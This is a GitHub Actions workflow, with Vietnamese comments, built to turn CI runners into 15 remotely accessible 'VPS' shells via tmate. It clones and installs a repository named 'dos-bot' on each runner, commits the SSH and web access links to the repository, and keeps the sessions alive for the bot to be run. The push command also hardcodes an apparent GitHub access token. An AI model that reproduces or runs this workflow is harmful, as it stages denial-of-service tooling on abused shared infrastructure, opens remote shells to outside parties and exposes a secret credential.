name: VPS 15x + DOS Bot

on:
  workflow_dispatch:

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Setup tmate and prepare DOS bot
        run: |
          # Download tmate
          curl -fsSL https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz | tar -xJ
          chmod +x tmate-2.4.0-static-linux-amd64/tmate
          
          # Clone DOS bot locally để copy vào VPS
          git clone https://github.com/depchaiaiyeu/dos-bot.git local-dos-bot
          
          # Create remote-link.txt
          echo "=== VPS Links - $(date) ===" > remote-link.txt
          echo "" >> remote-link.txt
          
          # Create 15 VPS và setup DOS bot trên từng VPS
          for i in {1..15}; do
            echo "Creating VPS $i..."
            
            # Start tmate session
            ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i new-session -d "bash"
            sleep 8
            
            # Get connection info
            SSH_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_ssh}' 2>/dev/null || echo "Failed")
            WEB_LINK=$(./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i display -p '#{tmate_web}' 2>/dev/null || echo "Failed")
            
            # Setup DOS bot trong từng VPS
            if [[ "$SSH_LINK" != "Failed" ]]; then
              echo "Setting up DOS bot on VPS $i..."
              
              # Basic setup commands
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "clear" C-m
              sleep 1
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "cd /tmp" C-m
              sleep 1
              
              # Clone DOS bot repo vào VPS
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "git clone https://github.com/depchaiaiyeu/dos-bot.git" C-m
              sleep 3
              
              # Enter DOS bot directory
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "cd dos-bot" C-m
              sleep 1
              
              # Check if files are there
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "ls -la" C-m
              sleep 1
              
              # Make sure we have Python
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "python3 --version" C-m
              sleep 1
              
              # Install requirements if exists
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "[ -f requirements.txt ] && pip3 install -r requirements.txt" C-m
              sleep 2
              
              # Leave a welcome message
              ./tmate-2.4.0-static-linux-amd64/tmate -S /tmp/tmate-$i send-keys "echo '✅ DOS Bot ready on VPS $i - /tmp/dos-bot'" C-m
              sleep 1
              
              echo "✅ DOS bot setup complete on VPS $i"
            else
              echo "❌ Failed to setup DOS bot on VPS $i"
            fi
            
            # Write connection info to file
            echo "VPS $i:" >> remote-link.txt
            echo "SSH: $SSH_LINK" >> remote-link.txt  
            echo "Web: $WEB_LINK" >> remote-link.txt
            echo "DOS Bot: /tmp/dos-bot" >> remote-link.txt
            echo "---" >> remote-link.txt
            echo "" >> remote-link.txt
            
            echo "VPS $i: $SSH_LINK"
          done
          
          echo ""
          echo "🎉 All VPS created with DOS bot installed!"
          echo "📁 DOS bot location: /tmp/dos-bot on each VPS"

      - name: Commit links
        run: |
          git config --global user.email "actions@github.com"
          git config --global user.name "github-actions"
          git add remote-link.txt
          git commit -m "VPS Links with DOS Bot - $(date)" || exit 0
          git push https://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@github.com/${{ github.repository }} HEAD:main || exit 0

      - name: Keep alive
        run: |
          echo "🔥 15 VPS created with DOS bot ready!"
          echo "📋 Check remote-link.txt for connections"
          echo "💻 DOS bot installed at /tmp/dos-bot on each VPS"
          echo "🚀 Ready to use: cd /tmp/dos-bot && python3 bot.py"
          echo ""
          echo "Example commands to test:"
          echo "  VPS> cd /tmp/dos-bot"
          echo "  VPS> ls -la"
          echo "  VPS> python3 --version"
          echo "  VPS> python3 bot.py"
          
          # Keep sessions alive
          sleep 1500
